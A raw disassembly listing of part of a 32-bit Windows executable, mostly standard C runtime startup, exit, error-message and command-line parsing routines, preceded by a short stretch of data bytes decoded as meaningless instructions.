  42443e:	sub    eax,DWORD PTR [edi+0x1b1689f2]
  424444:	sbb    ah,al
  424446:	test   eax,0xc73345d6
  42444b:	scas   al,BYTE PTR es:[edi]
  42444c:	inc    ebp
  42444d:	dec    edi
  42444e:	imul   edi,DWORD PTR [edx+0x72],0x4d
  424452:	mov    esi,0x33c9b62b
  424457:	fidiv  DWORD PTR [esi-0xf]
  42445a:	das    
  42445b:	xchg   ecx,eax
  42445c:	into   
  42445d:	scas   al,BYTE PTR es:[edi]
  42445e:	xchg   ebx,eax
  42445f:	xchg   ebx,eax
  424460:	shl    BYTE PTR [esp+ebx*8],cl
  424463:	test   eax,0xdf09d9b7
  424468:	outs   dx,BYTE PTR ds:[esi]
  424469:	sub    eax,ecx
  42446b:	xchg   edx,eax
  42446c:	cld    
  42446d:	sahf   
  42446e:	pop    esi
  42446f:	cdq    
  424470:	cmp    dh,ch
  424472:	fmul   st,st(1)
  424474:	in     eax,0x1b
  424476:	dec    esi
  424477:	ja     0x42447b
  424479:	adc    al,0x6c
  42447b:	add    ebp,esi
  42447d:	loope  0x424441
  42447f:	fld    QWORD PTR [edi+ebx*8+0x786b2241]
  424486:	ins    DWORD PTR es:[edi],dx
  424487:	inc    esi
  424488:	daa    
  424489:	and    BYTE PTR [eax],dh
  42448b:	jmp    0xedbaeb61
  424490:	mov    ebp,0x14f41dc4
  424495:	hlt    
  424496:	loop   0x424503
  424498:	ss add eax,0xc169c44d
  42449e:	aam    0x76
  4244a0:	jl     0x424481
  4244a2:	jecxz  0x424431
  4244a4:	mov    edi,0xfe6f1dc2
  4244a9:	daa    
  4244aa:	sbb    BYTE PTR [ebx],cl
  4244ac:	or     al,0x10
  4244ae:	cmp    cl,ch
  4244b0:	cmp    al,0xe2
  4244b2:	aam    0x98
  4244b4:	xchg   BYTE PTR [esi+0x59],cl
  4244b7:	ret    
  4244b8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4244b9:	ins    DWORD PTR es:[edi],dx
  4244ba:	push   ebx
  4244bb:	repz push edi
  4244bd:	(bad)  
  4244be:	cld    
  4244bf:	mov    ds:0xac95d763,eax
  4244c4:	push   0x0
  4244c6:	push   0x0
  4244c8:	call   0x4244f0
  4244cd:	push   0xa
  4244cf:	push   0x0
  4244d1:	push   0x0
  4244d3:	call   DWORD PTR ds:0x429054
  4244d9:	xor    eax,eax
  4244db:	add    esp,0x10
  4244de:	ret    0x10
  4244e1:	nop
  4244e2:	nop
  4244e3:	nop
  4244e4:	nop
  4244e5:	nop
  4244e6:	nop
  4244e7:	nop
  4244e8:	nop
  4244e9:	nop
  4244ea:	nop
  4244eb:	nop
  4244ec:	nop
  4244ed:	nop
  4244ee:	nop
  4244ef:	nop
  4244f0:	jmp    DWORD PTR ds:0x429144
  4244f6:	jmp    DWORD PTR ds:0x429140
  4244fc:	cmp    DWORD PTR ds:0x4635bc,0x1
  424503:	jne    0x42450a
  424505:	call   0x424a48
  42450a:	push   DWORD PTR [esp+0x4]
  42450e:	call   0x4248d1
  424513:	push   0xff
  424518:	call   DWORD PTR ds:0x462cb4
  42451e:	pop    ecx
  42451f:	pop    ecx
  424520:	ret    
  424521:	cmp    DWORD PTR ds:0x4635bc,0x1
  424528:	jne    0x42452f
  42452a:	call   0x424a48
  42452f:	push   DWORD PTR [esp+0x4]
  424533:	call   0x4248d1
  424538:	push   0xff
  42453d:	call   0x424717
  424542:	pop    ecx
  424543:	pop    ecx
  424544:	ret    
  424545:	push   0x60
  424547:	push   0x429268
  42454c:	call   0x425434
  424551:	mov    edi,0x94
  424556:	mov    eax,edi
  424558:	call   0x425480
  42455d:	mov    DWORD PTR [ebp-0x18],esp
  424560:	mov    esi,esp
  424562:	mov    DWORD PTR [esi],edi
  424564:	push   esi
  424565:	call   DWORD PTR ds:0x429098
  42456b:	mov    ecx,DWORD PTR [esi+0x10]
  42456e:	mov    DWORD PTR ds:0x4635c4,ecx
  424574:	mov    eax,DWORD PTR [esi+0x4]
  424577:	mov    ds:0x4635d0,eax
  42457c:	mov    edx,DWORD PTR [esi+0x8]
  42457f:	mov    DWORD PTR ds:0x4635d4,edx
  424585:	mov    esi,DWORD PTR [esi+0xc]
  424588:	and    esi,0x7fff
  42458e:	mov    DWORD PTR ds:0x4635c8,esi
  424594:	cmp    ecx,0x2
  424597:	je     0x4245a5
  424599:	or     esi,0x8000
  42459f:	mov    DWORD PTR ds:0x4635c8,esi
  4245a5:	shl    eax,0x8
  4245a8:	add    eax,edx
  4245aa:	mov    ds:0x4635cc,eax
  4245af:	xor    esi,esi
  4245b1:	push   esi
  4245b2:	mov    edi,DWORD PTR ds:0x42902c
  4245b8:	call   edi
  4245ba:	cmp    WORD PTR [eax],0x5a4d
  4245bf:	jne    0x4245e0
  4245c1:	mov    ecx,DWORD PTR [eax+0x3c]
  4245c4:	add    ecx,eax
  4245c6:	cmp    DWORD PTR [ecx],0x4550
  4245cc:	jne    0x4245e0
  4245ce:	movzx  eax,WORD PTR [ecx+0x18]
  4245d2:	cmp    eax,0x10b
  4245d7:	je     0x4245f8
  4245d9:	cmp    eax,0x20b
  4245de:	je     0x4245e5
  4245e0:	mov    DWORD PTR [ebp-0x1c],esi
  4245e3:	jmp    0x42460c
  4245e5:	cmp    DWORD PTR [ecx+0x84],0xe
  4245ec:	jbe    0x4245e0
  4245ee:	xor    eax,eax
  4245f0:	cmp    DWORD PTR [ecx+0xf8],esi
  4245f6:	jmp    0x424606
  4245f8:	cmp    DWORD PTR [ecx+0x74],0xe
  4245fc:	jbe    0x4245e0
  4245fe:	xor    eax,eax
  424600:	cmp    DWORD PTR [ecx+0xe8],esi
  424606:	setne  al
  424609:	mov    DWORD PTR [ebp-0x1c],eax
  42460c:	push   0x1
  42460e:	call   0x4253e3
  424613:	pop    ecx
  424614:	test   eax,eax
  424616:	jne    0x424620
  424618:	push   0x1c
  42461a:	call   0x424521
  42461f:	pop    ecx
  424620:	call   0x42535a
  424625:	test   eax,eax
  424627:	jne    0x424631
  424629:	push   0x10
  42462b:	call   0x424521
  424630:	pop    ecx
  424631:	call   0x425243
  424636:	mov    DWORD PTR [ebp-0x4],esi
  424639:	call   0x425045
  42463e:	test   eax,eax
  424640:	jge    0x42464a
  424642:	push   0x1b
  424644:	call   0x4244fc
  424649:	pop    ecx
  42464a:	call   DWORD PTR ds:0x429094
  424650:	mov    ds:0x463d74,eax
  424655:	call   0x424f23
  42465a:	mov    ds:0x4635b4,eax
  42465f:	call   0x424e81
  424664:	test   eax,eax
  424666:	jge    0x424670
  424668:	push   0x8
  42466a:	call   0x4244fc
  42466f:	pop    ecx
  424670:	call   0x424c4e
  424675:	test   eax,eax
  424677:	jge    0x424681
  424679:	push   0x9
  42467b:	call   0x4244fc
  424680:	pop    ecx
  424681:	call   0x424759
  424686:	mov    DWORD PTR [ebp-0x20],eax
  424689:	cmp    eax,esi
  42468b:	je     0x424694
  42468d:	push   eax
  42468e:	call   0x4244fc
  424693:	pop    ecx
  424694:	mov    DWORD PTR [ebp-0x38],esi
  424697:	lea    eax,[ebp-0x64]
  42469a:	push   eax
  42469b:	call   DWORD PTR ds:0x429090
  4246a1:	call   0x424be5
  4246a6:	mov    DWORD PTR [ebp-0x68],eax
  4246a9:	test   BYTE PTR [ebp-0x38],0x1
  4246ad:	je     0x4246b5
  4246af:	movzx  eax,WORD PTR [ebp-0x34]
  4246b3:	jmp    0x4246b8
  4246b5:	push   0xa
  4246b7:	pop    eax
  4246b8:	push   eax
  4246b9:	push   DWORD PTR [ebp-0x68]
  4246bc:	push   esi
  4246bd:	push   esi
  4246be:	call   edi
  4246c0:	push   eax
  4246c1:	call   0x423030
  4246c6:	mov    edi,eax
  4246c8:	mov    DWORD PTR [ebp-0x6c],edi
  4246cb:	cmp    DWORD PTR [ebp-0x1c],esi
  4246ce:	jne    0x4246d6
  4246d0:	push   edi
  4246d1:	call   0x424891
  4246d6:	call   0x4248b3
  4246db:	jmp    0x424708
  4246dd:	mov    eax,DWORD PTR [ebp-0x14]
  4246e0:	mov    ecx,DWORD PTR [eax]
  4246e2:	mov    ecx,DWORD PTR [ecx]
  4246e4:	mov    DWORD PTR [ebp-0x70],ecx
  4246e7:	push   eax
  4246e8:	push   ecx
  4246e9:	call   0x424a81
  4246ee:	pop    ecx
  4246ef:	pop    ecx
  4246f0:	ret    
  4246f1:	mov    esp,DWORD PTR [ebp-0x18]
  4246f4:	mov    edi,DWORD PTR [ebp-0x70]
  4246f7:	cmp    DWORD PTR [ebp-0x1c],0x0
  4246fb:	jne    0x424703
  4246fd:	push   edi
  4246fe:	call   0x4248a2
  424703:	call   0x4248c2
  424708:	or     DWORD PTR [ebp-0x4],0xffffffff
  42470c:	mov    eax,edi
  42470e:	lea    esp,[ebp-0x7c]
  424711:	call   0x42546f
  424716:	ret    
  424717:	push   0x429284
  42471c:	call   DWORD PTR ds:0x42902c
  424722:	test   eax,eax
  424724:	je     0x42473c
  424726:	push   0x429274
  42472b:	push   eax
  42472c:	call   DWORD PTR ds:0x429028
  424732:	test   eax,eax
  424734:	je     0x42473c
  424736:	push   DWORD PTR [esp+0x4]
  42473a:	call   eax
  42473c:	push   DWORD PTR [esp+0x4]
  424740:	call   DWORD PTR ds:0x42909c
  424746:	int3   
  424747:	push   0x8
  424749:	call   0x4255ef
  42474e:	pop    ecx
  42474f:	ret    
  424750:	push   0x8
  424752:	call   0x42555b
  424757:	pop    ecx
  424758:	ret    
  424759:	mov    eax,ds:0x463d70
  42475e:	test   eax,eax
  424760:	je     0x424764
  424762:	call   eax
  424764:	push   esi
  424765:	push   edi
  424766:	mov    ecx,0x42b00c
  42476b:	mov    edi,0x42b018
  424770:	xor    eax,eax
  424772:	cmp    ecx,edi
  424774:	mov    esi,ecx
  424776:	jae    0x42478f
  424778:	test   eax,eax
  42477a:	jne    0x4247bb
  42477c:	mov    ecx,DWORD PTR [esi]
  42477e:	test   ecx,ecx
  424780:	je     0x424784
  424782:	call   ecx
  424784:	add    esi,0x4
  424787:	cmp    esi,edi
  424789:	jb     0x424778
  42478b:	test   eax,eax
  42478d:	jne    0x4247bb
  42478f:	push   0x425287
  424794:	call   0x425700
  424799:	mov    esi,0x42b000
  42479e:	mov    eax,esi
  4247a0:	mov    edi,0x42b008
  4247a5:	cmp    eax,edi
  4247a7:	pop    ecx
  4247a8:	jae    0x4247b9
  4247aa:	mov    eax,DWORD PTR [esi]
  4247ac:	test   eax,eax
  4247ae:	je     0x4247b2
  4247b0:	call   eax
  4247b2:	add    esi,0x4
  4247b5:	cmp    esi,edi
  4247b7:	jb     0x4247aa
  4247b9:	xor    eax,eax
  4247bb:	pop    edi
  4247bc:	pop    esi
  4247bd:	ret    
  4247be:	push   ebp
  4247bf:	mov    ebp,esp
  4247c1:	push   esi
  4247c2:	push   edi
  4247c3:	push   0x8
  4247c5:	call   0x4255ef
  4247ca:	xor    esi,esi
  4247cc:	inc    esi
  4247cd:	cmp    DWORD PTR ds:0x463604,esi
  4247d3:	pop    ecx
  4247d4:	jne    0x4247e6
  4247d6:	push   DWORD PTR [ebp+0x8]
  4247d9:	call   DWORD PTR ds:0x429064
  4247df:	push   eax
  4247e0:	call   DWORD PTR ds:0x4290a0
  4247e6:	cmp    DWORD PTR [ebp+0xc],0x0
  4247ea:	mov    al,BYTE PTR [ebp+0x10]
  4247ed:	mov    DWORD PTR ds:0x463600,esi
  4247f3:	mov    ds:0x4635fc,al
  4247f8:	jne    0x42484c
  4247fa:	mov    ecx,DWORD PTR ds:0x463d68
  424800:	test   ecx,ecx
  424802:	je     0x42482d
  424804:	mov    eax,ds:0x463d64
  424809:	sub    eax,0x4
  42480c:	cmp    eax,ecx
  42480e:	jmp    0x424826
  424810:	mov    eax,DWORD PTR [eax]
  424812:	test   eax,eax
  424814:	je     0x424818
  424816:	call   eax
  424818:	mov    eax,ds:0x463d64
  42481d:	sub    eax,0x4
  424820:	cmp    eax,DWORD PTR ds:0x463d68
  424826:	mov    ds:0x463d64,eax
  42482b:	jae    0x424810
  42482d:	mov    eax,0x42b01c
  424832:	mov    esi,0x42b020
  424837:	cmp    eax,esi
  424839:	mov    edi,eax
  42483b:	jae    0x42484c
  42483d:	mov    eax,DWORD PTR [edi]
  42483f:	test   eax,eax
  424841:	je     0x424845
  424843:	call   eax
  424845:	add    edi,0x4
  424848:	cmp    edi,esi
  42484a:	jb     0x42483d
  42484c:	mov    eax,0x42b024
  424851:	mov    esi,0x42b028
  424856:	cmp    eax,esi
  424858:	mov    edi,eax
  42485a:	jae    0x42486b
  42485c:	mov    eax,DWORD PTR [edi]
  42485e:	test   eax,eax
  424860:	je     0x424864
  424862:	call   eax
  424864:	add    edi,0x4
  424867:	cmp    edi,esi
  424869:	jb     0x42485c
  42486b:	cmp    DWORD PTR [ebp+0x10],0x0
  42486f:	pop    edi
  424870:	pop    esi
  424871:	je     0x42487c
  424873:	push   0x8
  424875:	call   0x42555b
  42487a:	jmp    0x42488e
  42487c:	push   DWORD PTR [ebp+0x8]
  42487f:	mov    DWORD PTR ds:0x463604,0x1
  424889:	call   0x424717
  42488e:	pop    ecx
  42488f:	pop    ebp
  424890:	ret    
  424891:	push   0x0
  424893:	push   0x0
  424895:	push   DWORD PTR [esp+0xc]
  424899:	call   0x4247be
  42489e:	add    esp,0xc
  4248a1:	ret    
  4248a2:	push   0x0
  4248a4:	push   0x1
  4248a6:	push   DWORD PTR [esp+0xc]
  4248aa:	call   0x4247be
  4248af:	add    esp,0xc
  4248b2:	ret    
  4248b3:	push   0x1
  4248b5:	push   0x0
  4248b7:	push   0x0
  4248b9:	call   0x4247be
  4248be:	add    esp,0xc
  4248c1:	ret    
  4248c2:	push   0x1
  4248c4:	push   0x1
  4248c6:	push   0x0
  4248c8:	call   0x4247be
  4248cd:	add    esp,0xc
  4248d0:	ret    
  4248d1:	push   ebp
  4248d2:	mov    ebp,esp
  4248d4:	sub    esp,0x10c
  4248da:	mov    eax,ds:0x462f30
  4248df:	xor    eax,DWORD PTR [ebp+0x4]
  4248e2:	mov    ecx,DWORD PTR [ebp+0x8]
  4248e5:	push   ebx
  4248e6:	push   esi
  4248e7:	mov    DWORD PTR [ebp-0x4],eax
  4248ea:	xor    edx,edx
  4248ec:	push   edi
  4248ed:	xor    eax,eax
  4248ef:	cmp    ecx,DWORD PTR [eax*8+0x462cc0]
  4248f6:	je     0x4248fe
  4248f8:	inc    eax
  4248f9:	cmp    eax,0x12
  4248fc:	jb     0x4248ef
  4248fe:	mov    esi,eax
  424900:	shl    esi,0x3
  424903:	cmp    ecx,DWORD PTR [esi+0x462cc0]
  424909:	jne    0x424a32
  42490f:	mov    eax,ds:0x4635bc
  424914:	cmp    eax,0x1
  424917:	je     0x424a0d
  42491d:	cmp    eax,edx
  42491f:	jne    0x42492e
  424921:	cmp    DWORD PTR ds:0x462cb8,0x1
  424928:	je     0x424a0d
  42492e:	cmp    ecx,0xfc
  424934:	je     0x424a32
  42493a:	push   0x104
  42493f:	lea    eax,[ebp-0x10c]
  424945:	push   eax
  424946:	push   edx
  424947:	mov    BYTE PTR [ebp-0x8],dl
  42494a:	call   DWORD PTR ds:0x4290a8
  424950:	test   eax,eax
  424952:	jne    0x424967
  424954:	lea    eax,[ebp-0x10c]
  42495a:	push   0x4295dc
  42495f:	push   eax
  424960:	call   0x425810
  424965:	pop    ecx
  424966:	pop    ecx
  424967:	lea    eax,[ebp-0x10c]
  42496d:	push   eax
  42496e:	lea    edi,[ebp-0x10c]
  424974:	call   0x425a40
  424979:	inc    eax
  42497a:	cmp    eax,0x3c
  42497d:	pop    ecx
  42497e:	jbe    0x4249a9
  424980:	lea    eax,[ebp-0x10c]
  424986:	push   eax
  424987:	call   0x425a40
  42498c:	mov    edi,eax
  42498e:	lea    eax,[ebp-0x10c]
  424994:	sub    eax,0x3b
  424997:	push   0x3
  424999:	add    edi,eax
  42499b:	push   0x4295d8
  4249a0:	push   edi
  4249a1:	call   0x425910
  4249a6:	add    esp,0x10
  4249a9:	push   edi
  4249aa:	call   0x425a40
  4249af:	push   DWORD PTR [esi+0x462cc4]
  4249b5:	mov    ebx,eax
  4249b7:	call   0x425a40
  4249bc:	lea    eax,[ebx+eax*1+0x1c]
  4249c0:	pop    ecx
  4249c1:	add    eax,0x3
  4249c4:	pop    ecx
  4249c5:	and    eax,0xfffffffc
  4249c8:	call   0x425480
  4249cd:	mov    ebx,esp
  4249cf:	push   0x4295bc
  4249d4:	push   ebx
  4249d5:	call   0x425810
  4249da:	push   edi
  4249db:	push   ebx
  4249dc:	call   0x425820
  4249e1:	push   0x4295b8
  4249e6:	push   ebx
  4249e7:	call   0x425820
  4249ec:	push   DWORD PTR [esi+0x462cc4]
  4249f2:	push   ebx
  4249f3:	call   0x425820
  4249f8:	push   0x12010
  4249fd:	push   0x429590
  424a02:	push   ebx
  424a03:	call   0x425712
  424a08:	add    esp,0x2c
  424a0b:	jmp    0x424a32
  424a0d:	push   edx
  424a0e:	lea    eax,[ebp+0x8]
  424a11:	push   eax
  424a12:	lea    esi,[esi+0x462cc4]
  424a18:	push   DWORD PTR [esi]
  424a1a:	call   0x425a40
  424a1f:	pop    ecx
  424a20:	push   eax
  424a21:	push   DWORD PTR [esi]
  424a23:	push   0xfffffff4
  424a25:	call   DWORD PTR ds:0x4290a4
  424a2b:	push   eax
  424a2c:	call   DWORD PTR ds:0x429080
  424a32:	lea    esp,[ebp-0x118]
  424a38:	mov    ecx,DWORD PTR [ebp-0x4]
  424a3b:	xor    ecx,DWORD PTR [ebp+0x4]
  424a3e:	call   0x425afc
  424a43:	pop    edi
  424a44:	pop    esi
  424a45:	pop    ebx
  424a46:	leave  
  424a47:	ret    
  424a48:	mov    eax,ds:0x4635bc
  424a4d:	cmp    eax,0x1
  424a50:	je     0x424a5f
  424a52:	test   eax,eax
  424a54:	jne    0x424a80
  424a56:	cmp    DWORD PTR ds:0x462cb8,0x1
  424a5d:	jne    0x424a80
  424a5f:	push   0xfc
  424a64:	call   0x4248d1
  424a69:	mov    eax,ds:0x463608
  424a6e:	test   eax,eax
  424a70:	pop    ecx
  424a71:	je     0x424a75
  424a73:	call   eax
  424a75:	push   0xff
  424a7a:	call   0x4248d1
  424a7f:	pop    ecx
  424a80:	ret    
  424a81:	push   ebp
  424a82:	mov    ebp,esp
  424a84:	push   ecx
  424a85:	push   ebx
  424a86:	push   esi
  424a87:	push   edi
  424a88:	call   0x4252e9
  424a8d:	mov    edi,DWORD PTR [ebp+0x8]
  424a90:	mov    esi,eax
  424a92:	mov    edx,DWORD PTR [esi+0x54]
  424a95:	mov    eax,ds:0x462dd4
  424a9a:	mov    ecx,edx
  424a9c:	cmp    DWORD PTR [ecx],edi
  424a9e:	je     0x424aad
  424aa0:	lea    ebx,[eax+eax*2]
  424aa3:	add    ecx,0xc
  424aa6:	lea    ebx,[edx+ebx*4]
  424aa9:	cmp    ecx,ebx
  424aab:	jb     0x424a9c
  424aad:	lea    eax,[eax+eax*2]
  424ab0:	lea    eax,[edx+eax*4]
  424ab3:	cmp    ecx,eax
  424ab5:	jae    0x424abb
  424ab7:	cmp    DWORD PTR [ecx],edi
  424ab9:	je     0x424abd
  424abb:	xor    ecx,ecx
  424abd:	test   ecx,ecx
  424abf:	je     0x424bd7
  424ac5:	mov    ebx,DWORD PTR [ecx+0x8]
  424ac8:	test   ebx,ebx
  424aca:	mov    DWORD PTR [ebp+0x8],ebx
  424acd:	je     0x424bd7
  424ad3:	cmp    ebx,0x5
  424ad6:	jne    0x424ae4
  424ad8:	and    DWORD PTR [ecx+0x8],0x0
  424adc:	xor    eax,eax
  424ade:	inc    eax
  424adf:	jmp    0x424be0
  424ae4:	cmp    ebx,0x1
  424ae7:	je     0x424bd2
  424aed:	mov    eax,DWORD PTR [esi+0x58]
  424af0:	mov    DWORD PTR [ebp-0x4],eax
  424af3:	mov    eax,DWORD PTR [ebp+0xc]
  424af6:	mov    DWORD PTR [esi+0x58],eax
  424af9:	mov    eax,DWORD PTR [ecx+0x4]
  424afc:	cmp    eax,0x8
  424aff:	jne    0x424bc4
  424b05:	mov    edx,DWORD PTR ds:0x462dc8
  424b0b:	mov    eax,ds:0x462dcc
  424b10:	add    eax,edx
  424b12:	cmp    edx,eax
  424b14:	jge    0x424b3d
  424b16:	lea    eax,[edx+edx*2]
  424b19:	shl    eax,0x2
  424b1c:	mov    edi,DWORD PTR [esi+0x54]
  424b1f:	and    DWORD PTR [eax+edi*1+0x8],0x0
  424b24:	mov    edi,DWORD PTR ds:0x462dc8
  424b2a:	mov    ebx,DWORD PTR ds:0x462dcc
  424b30:	inc    edx
  424b31:	add    ebx,edi
  424b33:	add    eax,0xc
  424b36:	cmp    edx,ebx
  424b38:	jl     0x424b1c
  424b3a:	mov    ebx,DWORD PTR [ebp+0x8]
  424b3d:	mov    ecx,DWORD PTR [ecx]
  424b3f:	cmp    ecx,0xc000008e
  424b45:	mov    edi,DWORD PTR [esi+0x5c]
  424b48:	jne    0x424b53
  424b4a:	mov    DWORD PTR [esi+0x5c],0x83
  424b51:	jmp    0x424bb7
  424b53:	cmp    ecx,0xc0000090
  424b59:	jne    0x424b64
  424b5b:	mov    DWORD PTR [esi+0x5c],0x81
  424b62:	jmp    0x424bb7
  424b64:	cmp    ecx,0xc0000091
  424b6a:	jne    0x424b75
  424b6c:	mov    DWORD PTR [esi+0x5c],0x84
  424b73:	jmp    0x424bb7
  424b75:	cmp    ecx,0xc0000093
  424b7b:	jne    0x424b86
  424b7d:	mov    DWORD PTR [esi+0x5c],0x85
  424b84:	jmp    0x424bb7
  424b86:	cmp    ecx,0xc000008d
  424b8c:	jne    0x424b97
  424b8e:	mov    DWORD PTR [esi+0x5c],0x82
  424b95:	jmp    0x424bb7
  424b97:	cmp    ecx,0xc000008f
  424b9d:	jne    0x424ba8
  424b9f:	mov    DWORD PTR [esi+0x5c],0x86
  424ba6:	jmp    0x424bb7
  424ba8:	cmp    ecx,0xc0000092
  424bae:	jne    0x424bb7
  424bb0:	mov    DWORD PTR [esi+0x5c],0x8a
  424bb7:	push   DWORD PTR [esi+0x5c]
  424bba:	push   0x8
  424bbc:	call   ebx
  424bbe:	pop    ecx
  424bbf:	mov    DWORD PTR [esi+0x5c],edi
  424bc2:	jmp    0x424bcb
  424bc4:	and    DWORD PTR [ecx+0x8],0x0
  424bc8:	push   eax
  424bc9:	call   ebx
  424bcb:	mov    eax,DWORD PTR [ebp-0x4]
  424bce:	pop    ecx
  424bcf:	mov    DWORD PTR [esi+0x58],eax
  424bd2:	or     eax,0xffffffff
  424bd5:	jmp    0x424be0
  424bd7:	push   DWORD PTR [ebp+0xc]
  424bda:	call   DWORD PTR ds:0x4290ac
  424be0:	pop    edi
  424be1:	pop    esi
  424be2:	pop    ebx
  424be3:	leave  
  424be4:	ret    
  424be5:	cmp    DWORD PTR ds:0x463d6c,0x0
  424bec:	jne    0x424bf3
  424bee:	call   0x42601c
  424bf3:	push   esi
  424bf4:	mov    esi,DWORD PTR ds:0x463d74
  424bfa:	test   esi,esi
  424bfc:	jne    0x424c05
  424bfe:	mov    esi,0x4295f3
  424c03:	jmp    0x424c4a
  424c05:	mov    al,BYTE PTR [esi]
  424c07:	cmp    al,0x22
  424c09:	jne    0x424c33
  424c0b:	inc    esi
  424c0c:	mov    al,BYTE PTR [esi]
  424c0e:	cmp    al,0x22
  424c10:	je     0x424c43
  424c12:	test   al,al
  424c14:	je     0x424c2c
  424c16:	movzx  eax,al
  424c19:	push   eax
  424c1a:	call   0x425b3b
  424c1f:	test   eax,eax
  424c21:	pop    ecx
  424c22:	je     0x424c25
  424c24:	inc    esi
  424c25:	inc    esi
  424c26:	mov    al,BYTE PTR [esi]
  424c28:	cmp    al,0x22
  424c2a:	jne    0x424c12
  424c2c:	cmp    BYTE PTR [esi],0x22
  424c2f:	jne    0x424c44
  424c31:	jmp    0x424c43
  424c33:	cmp    al,0x20
  424c35:	jbe    0x424c44
  424c37:	inc    esi
  424c38:	cmp    BYTE PTR [esi],0x20
  424c3b:	ja     0x424c37
  424c3d:	jmp    0x424c44
  424c3f:	cmp    al,0x20
  424c41:	ja     0x424c4a
  424c43:	inc    esi
  424c44:	mov    al,BYTE PTR [esi]
  424c46:	test   al,al
  424c48:	jne    0x424c3f
  424c4a:	mov    eax,esi
  424c4c:	pop    esi
  424c4d:	ret    
  424c4e:	push   ebx
  424c4f:	xor    ebx,ebx
  424c51:	cmp    DWORD PTR ds:0x463d6c,ebx
  424c57:	push   esi
  424c58:	push   edi
  424c59:	jne    0x424c60
  424c5b:	call   0x42601c
  424c60:	mov    esi,DWORD PTR ds:0x4635b4
  424c66:	xor    edi,edi
  424c68:	cmp    esi,ebx
  424c6a:	jne    0x424c7e
  424c6c:	jmp    0x424c9e
  424c6e:	cmp    al,0x3d
  424c70:	je     0x424c73
  424c72:	inc    edi
  424c73:	push   esi
  424c74:	call   0x425a40
  424c79:	pop    ecx
  424c7a:	lea    esi,[esi+eax*1+0x1]
  424c7e:	mov    al,BYTE PTR [esi]
  424c80:	cmp    al,bl
  424c82:	jne    0x424c6e
  424c84:	lea    eax,[edi*4+0x4]
  424c8b:	push   eax
  424c8c:	call   0x426152
  424c91:	mov    edi,eax
  424c93:	cmp    edi,ebx
  424c95:	pop    ecx
  424c96:	mov    DWORD PTR ds:0x4635e4,edi
  424c9c:	jne    0x424ca3
  424c9e:	or     eax,0xffffffff
  424ca1:	jmp    0x424cfb
  424ca3:	mov    esi,DWORD PTR ds:0x4635b4
  424ca9:	push   ebp
  424caa:	jmp    0x424cd6
  424cac:	push   esi
  424cad:	call   0x425a40
  424cb2:	mov    ebp,eax
  424cb4:	inc    ebp
  424cb5:	cmp    BYTE PTR [esi],0x3d
  424cb8:	pop    ecx
  424cb9:	je     0x424cd4
  424cbb:	push   ebp
  424cbc:	call   0x426152
  424cc1:	cmp    eax,ebx
  424cc3:	pop    ecx
  424cc4:	mov    DWORD PTR [edi],eax
  424cc6:	je     0x424cff
  424cc8:	push   esi
  424cc9:	push   eax
  424cca:	call   0x425810
  424ccf:	pop    ecx
  424cd0:	pop    ecx
  424cd1:	add    edi,0x4
  424cd4:	add    esi,ebp
  424cd6:	cmp    BYTE PTR [esi],bl
  424cd8:	jne    0x424cac
  424cda:	push   DWORD PTR ds:0x4635b4
  424ce0:	call   0x42603a
  424ce5:	mov    DWORD PTR ds:0x4635b4,ebx
  424ceb:	mov    DWORD PTR [edi],ebx
  424ced:	mov    DWORD PTR ds:0x463d60,0x1
  424cf7:	xor    eax,eax
  424cf9:	pop    ecx
  424cfa:	pop    ebp
  424cfb:	pop    edi
  424cfc:	pop    esi
  424cfd:	pop    ebx
  424cfe:	ret    
  424cff:	push   DWORD PTR ds:0x4635e4
  424d05:	call   0x42603a
  424d0a:	mov    DWORD PTR ds:0x4635e4,ebx
  424d10:	or     eax,0xffffffff
  424d13:	jmp    0x424cf9
  424d15:	push   ebp
  424d16:	mov    ebp,esp
  424d18:	push   ecx
  424d19:	push   ebx
  424d1a:	mov    ebx,DWORD PTR [ebp+0xc]
  424d1d:	xor    edx,edx
  424d1f:	cmp    DWORD PTR [ebp+0x8],edx
  424d22:	push   edi
  424d23:	mov    DWORD PTR [esi],edx
  424d25:	mov    edi,ecx
  424d27:	mov    DWORD PTR [ebx],0x1
  424d2d:	je     0x424d38
  424d2f:	mov    ecx,DWORD PTR [ebp+0x8]
  424d32:	add    DWORD PTR [ebp+0x8],0x4
  424d36:	mov    DWORD PTR [ecx],edi
  424d38:	cmp    BYTE PTR [eax],0x22
  424d3b:	jne    0x424d4b
  424d3d:	xor    ecx,ecx
  424d3f:	test   edx,edx
  424d41:	sete   cl
  424d44:	inc    eax
  424d45:	mov    edx,ecx
  424d47:	mov    cl,0x22
  424d49:	jmp    0x424d78
  424d4b:	inc    DWORD PTR [esi]
  424d4d:	test   edi,edi
  424d4f:	je     0x424d56
  424d51:	mov    cl,BYTE PTR [eax]
  424d53:	mov    BYTE PTR [edi],cl
  424d55:	inc    edi
  424d56:	mov    cl,BYTE PTR [eax]
  424d58:	movzx  ebx,cl
  424d5b:	inc    eax
  424d5c:	test   BYTE PTR [ebx+0x463a21],0x4
  424d63:	je     0x424d71
  424d65:	inc    DWORD PTR [esi]
  424d67:	test   edi,edi
  424d69:	je     0x424d70
  424d6b:	mov    bl,BYTE PTR [eax]
  424d6d:	mov    BYTE PTR [edi],bl
  424d6f:	inc    edi
  424d70:	inc    eax
  424d71:	test   cl,cl
  424d73:	mov    ebx,DWORD PTR [ebp+0xc]
  424d76:	je     0x424daa
  424d78:	test   edx,edx
  424d7a:	jne    0x424d38
  424d7c:	cmp    cl,0x20
  424d7f:	je     0x424d86
  424d81:	cmp    cl,0x9
  424d84:	jne    0x424d38
  424d86:	test   edi,edi
  424d88:	je     0x424d8e
  424d8a:	and    BYTE PTR [edi-0x1],0x0
  424d8e:	and    DWORD PTR [ebp-0x4],0x0
  424d92:	cmp    BYTE PTR [eax],0x0
  424d95:	je     0x424e71
  424d9b:	mov    cl,BYTE PTR [eax]
  424d9d:	cmp    cl,0x20
  424da0:	je     0x424da7
  424da2:	cmp    cl,0x9
  424da5:	jne    0x424dad
  424da7:	inc    eax
  424da8:	jmp    0x424d9b
  424daa:	dec    eax
  424dab:	jmp    0x424d8e
  424dad:	cmp    BYTE PTR [eax],0x0
  424db0:	je     0x424e71
  424db6:	cmp    DWORD PTR [ebp+0x8],0x0
  424dba:	je     0x424dc5
  424dbc:	mov    ecx,DWORD PTR [ebp+0x8]
  424dbf:	add    DWORD PTR [ebp+0x8],0x4
  424dc3:	mov    DWORD PTR [ecx],edi
  424dc5:	inc    DWORD PTR [ebx]
  424dc7:	xor    ebx,ebx
  424dc9:	inc    ebx
